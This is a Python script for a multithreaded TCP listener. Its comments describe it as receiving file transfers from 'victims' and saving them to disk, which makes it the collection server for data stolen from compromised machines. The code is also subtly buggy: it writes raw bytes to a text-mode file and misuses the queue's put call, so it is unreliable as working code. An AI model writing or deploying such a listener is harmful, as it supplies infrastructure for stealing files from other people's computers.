import socket
import threading
import queue

def main() -> None:
    start("0.0.0.0", 5555)
    
def start(host: str, port: int):
    """
    Function that starts the listener and handles requests
    coming in from the victims
    """
    # Start socket object as a listener
    serverSocket: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind((host, port))
    serverSocket.listen()
    print(f"Server listening on {host}:{port}...")

    requestQueue = queue.Queue()  # Start a queue for the requests of the file

    # Receive connections and prompt whether we want them or not
    try:
        while True:
            clientSocket, clientAddress = serverSocket.accept()
            requestQueue.put(clientSocket, clientAddress)  # Put in a new request to the queue
            # Start a thread to complete one connection and file transfer
            thread = threading.Thread(target=threadHandler, args=(clientSocket, clientAddress, requestQueue))
            thread.start()
            requestQueue.join()  # Stop everything here until all the threads have finished with their requests
            prompt(host, port)  # Prompt if you want the listener to keep running
    # Any exceptions will get caught here
    except Exception as e:
        print(f"Error occurred: {e}")
    finally:
        serverSocket.close()

def threadHandler(clientSocket: socket.socket, clientAddress: socket.socket, requestQueue: queue.Queue):
    """
    This is the thread handler that handles each request and
    takes it off the queue when done
    """
    # Check the incoming connection and see if we want to accept it
    print(f"Incoming connection from {clientAddress}")
    acept: str = input("Do you want to accept the connection? (y|n): ")
    if acept.lower() != "y":
        print("Connection declined. Closing listener!")
        clientSocket.close()  # Close the socket
        requestQueue.task_done()  # Mark the request as done and remove it from the queue
        return
    # Received the file data from the client
    filepath: str = input("Give the filepath for the file: ")
    with open(filepath, 'a') as file:
        while True:
            data = clientSocket.recv(1024)
            if not data:
                break
            file.write(data)
    print(f"File received succesfully from {clientAddress}") # Debug message to see if file was received
    clientSocket.close()  # Close the socket
    requestQueue.task_done()  # Mark the request as done and remove it from the queue

def prompt(host: str, port: int) -> None:
    """
    Simple prompting function to prompt the user (me) whether I want
    to keep the listener running
    """
    prompt: str = input("Do you wish to continue listening? (y|n): ")
    if prompt.lower() == "y":
        print(f"Server listening on {host}:{port}...")
        return
    else:
        print("Goodbye!")
        exit(0)

if __name__ == "__main__":
    main()